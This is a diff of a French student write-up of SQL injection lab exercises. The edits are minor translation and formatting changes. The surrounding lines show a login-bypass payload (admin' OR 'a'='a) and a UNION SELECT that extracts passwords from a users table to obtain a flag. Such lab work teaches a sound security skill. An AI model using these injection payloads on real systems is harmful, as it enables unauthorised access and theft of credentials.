@@ -23,7 +23,7 @@ Groupe : Jullian BACLE, Clément JELEFF
 ### `Simple login Bypass`
 
 **Consigne :**\
-Essayez de trouver un moyen de vous connecter en tant qu'admin.
+Try to find a way to login as the admin.
 
 > **Goal :  is_valid_password = 1**
 
@@ -50,7 +50,7 @@ admin' OR 'a'='a
 ```
 
 **Explication de l'injection :**\
-l'injection `OR 'a'='a` permet de contourner la vérification du mot de passe, en précisant seulement qu'il est `true`.
+L'injection `OR 'a'='a` permet de contourner la vérification du mot de passe, en précisant seulement qu'il est `true`.
 
 ---
 
@@ -86,15 +86,13 @@ $email = x'='x' UNION SELECT id, password FROM users'
     "username": 1,
     "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
   },
-
-  [...]
 ]
 ```
 
 > FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}
 
 **Explication de l'injection :**\
-Utilisation de la commande `UNION` permettant de mettre bout à bout le résultat de plusieurs requête. Ainsi ça nous permet de faire passer un requête de demande d'id et de password sur la table users.
+L'utilisation de la commande `UNION` permettant de mettre bout à bout le résultat de plusieurs requête. Ainsi ça nous permet de faire passer un requête de demande d'id et de password sur la table users.
 
 ---
 
@@ -208,7 +206,6 @@ LIMIT 5;
     "email": "brenda57@hotmail.com",
     "enabled": 1
   },
-  [...]
 ]
 ```
 
